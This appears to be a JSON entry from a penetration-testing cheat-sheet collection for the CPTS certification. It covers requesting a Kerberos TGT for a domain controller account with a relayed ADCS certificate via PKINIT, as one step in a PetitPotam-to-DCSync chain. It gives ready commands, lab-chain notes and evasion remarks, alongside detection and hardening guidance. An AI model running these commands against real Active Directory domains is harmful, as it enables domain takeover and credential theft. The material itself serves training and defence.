@@ -1,0 +1,79 @@
+{
+  "id": "ad-pkinit-gettgt",
+  "name": "gettgtpkinit.py - Get TGT via PKINIT Certificate",
+  "command": "python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 <base64_cert> <domain>/<dc_host>$ <output>.ccache",
+  "description": "Uses a captured ADCS certificate (obtained via PetitPotam \u2192 ntlmrelayx relay) to request a Kerberos TGT for the DC machine account via PKINIT. The DC machine account has replication rights \u2014 this TGT enables DCSync. Part of the PetitPotam \u2192 ADCS \u2192 PKINIT \u2192 DCSync chain.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "Bleeding Edge Vulnerabilities",
+  "certifications": [
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "pkinit",
+    "certificate",
+    "kerberos",
+    "tgt",
+    "adcs",
+    "petitpotam"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHAT PKINIT IS ===\nPKINIT = Public Key Cryptography for Initial Authentication in Kerberos.\nNormally Kerberos proves identity via password hash (AS-REQ encrypted with NT hash).\nWith PKINIT, a certificate proves identity instead \u2014 the private key signs the AS-REQ.\n\nADCS certificates can contain a UPN (User Principal Name) that identifies the subject.\nA certificate issued to DC01$@INLANEFREIGHT.LOCAL via ADCS can be used with PKINIT\nto get a TGT for the DC01$ machine account.\n\n=== WHY DC MACHINE ACCOUNT = DCSync ===\nDomain Controllers' machine accounts automatically have DCSync rights:\n  - DS-Replication-Get-Changes\n  - DS-Replication-Get-Changes-All\nThese are assigned by default as part of DC functionality.\nSo: TGT for DC01$ \u2192 can DCSync the entire domain.\n\n=== FULL PKINIT CHAIN (from PetitPotam) ===\n# 1. ntlmrelayx captured base64 cert from ADCS enrollment (previous card)\n# 2. Request TGT using the cert (this card)\nKRB5CCNAME=dc01.ccache python3 /opt/PKINITtools/gettgtpkinit.py \\\n  -pfx-base64 <base64_cert_from_ntlmrelayx> \\\n  INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ dc01.ccache\n\n# 3. Set the TGT in your env\nexport KRB5CCNAME=dc01.ccache\n\n# 4. Extract AS_REP_KEY from output (needed for getnthash step)\n# gettgtpkinit.py prints: [*] AS-REP encryption key (you need this later):\n# as_rep_key = <hex string>\n\n# 5. Get DC machine account NT hash (ad-pkinit-getnthash)\n# 6. DCSync (ad-secretsdump-dcsync)\n\n=== OUTPUT TO SAVE ===\nThe ccache file (use with KRB5CCNAME=<file>)\nThe AS-REP encryption key printed during TGT issuance \u2014 SAVE IT for getnthash.py",
+  "examples": [
+    {
+      "label": "Get TGT for DC machine account via cert",
+      "command": "python3 /opt/PKINITtools/gettgtpkinit.py -pfx-base64 <base64_cert> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$ dc01.ccache"
+    },
+    {
+      "label": "Set the TGT",
+      "command": "export KRB5CCNAME=dc01.ccache"
+    },
+    {
+      "label": "Verify the TGT",
+      "command": "klist"
+    }
+  ],
+  "references": [
+    {
+      "title": "PKINITtools (dirkjanm)",
+      "url": "https://github.com/dirkjanm/PKINITtools"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-secretsdump-kerberos",
+      "note": "DCSync using the DC TGT (-k -no-pass).",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "PKINIT (Public Key Cryptography for Initial Authentication) is an RFC 4556 Kerberos extension that enables X.509 certificate-based pre-authentication in place of a password. After obtaining a certificate issued by the domain CA for the target account (DC machine account via PetitPotam relay), gettgtpkinit.py presents the certificate + private key in a Kerberos AS-REQ. The KDC validates the certificate against the trusted CA chain and issues a TGT for the authenticated account. The AS-REP also contains an encryption key (stored by gettgtpkinit for use by getnthash.py).",
+    "prerequisites": "ADCS-issued certificate for the target account (.pfx, or cert + private key files). Network access to DC Kerberos port (TCP 88). PKINITtools (gettgtpkinit.py) installed. The certificate must be for an account with DCSync rights (DC machine account) for the next steps to yield domain compromise.",
+    "impact": "Kerberos TGT for the DC machine account \u2014 machine accounts hold Replicating Directory Changes rights by default, enabling DCSync. The TGT can be exported as a .ccache for direct use with secretsdump.py -k, or the AS-REP key can be fed into getnthash.py to extract the NT hash for pass-the-hash DCSync.",
+    "detection": "Windows Security Event 4768 (AS-REQ/TGT issued) on the DC with PADATA type 17/18 (pk-as-req/pk-as-rep) indicating certificate-based pre-authentication. Certificate-based TGT requests from IP addresses other than the DC itself or known smart-card users are anomalous. Microsoft Defender for Identity has PKINIT abuse detection. Kerberos audit logs with PA-TYPE 17 from unexpected source IPs.",
+    "artifacts": "KDC 4768 log entry with PKINIT pre-auth type, .ccache file on attacker's Linux disk (KRB5CCNAME), certificate file (.pfx), AS-REP encryption key stored by gettgtpkinit.py.",
+    "prevention": "Revoke the abused certificate immediately via the CA management console. Audit ADCS certificate templates \u2014 restrict machine authentication templates to only legitimate enrollment. Enable KDC certificate validation policies. Monitor ADCS enrollment logs for unusual machine-account certificate issuance. MDI for PKINIT abuse detection. Removing ADCS or hardening it (EPA) upstream prevents the certificate from being obtained in the first place.",
+    "evasion": "Single Kerberos AS-REQ using standard PKINIT protocol \u2014 looks like a smart-card or certificate-based logon. The distinguishing factor is the source IP and the account being authenticated. Operates entirely from Linux \u2014 no Windows memory artifacts until DCSync follows.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1649"
+    ],
+    "misconfiguration": "PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) allows certificate-based Kerberos authentication. When an attacker obtains a valid certificate for a machine account (e.g., via ADCS ESC8/ESC1 or after NoPac), they can use it to request a TGT and then use S4U2Self to get a TGS as any user \u2014 including Domain Admins. The machine account's NTLM hash can also be recovered via PKINIT's AS-REP for offline cracking or PtH.",
+    "vulnerable_config": "# Scenario: attacker has a cert for DC$ (obtained via PetitPotam + ADCS ESC8)\n# PKINIT is enabled by default on all AD environments with ADCS\n# impacket-gettgt using the cert:\n#   openssl pkcs12 -in dc.pfx -nocerts -out dc.key (extract key)\n#   gettgt.py -cert-pem dc.crt -key-pem dc.key corp.local/DC$\n# -> returns TGT for DC machine account\n# -> use S4U2Self for impersonation of any user",
+    "secure_config": "# Prevent ADCS misconfigs that enable cert theft (see ESC1/ESC8 cards)\n# Patch NoPac (KB5008102 + KB5008380)\n\n# Monitor PKINIT authentication:\n# Event 4768 with Certificate Info section populated (non-empty)\n# Certificates issued to machine accounts by unexpected CAs\n\n# Enable Strong Certificate Mapping (Windows Server 2022+):\n# HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\n#   StrongCertificateBindingEnforcement = 2 (full enforcement)\n# This prevents certificate-to-account mapping abuse\n\n# CA hardening: restrict which templates allow machine account enrollment\n# Require Manager Approval on sensitive templates"
+  },
+  "tools": [
+    "PKINITtools"
+  ]
+}
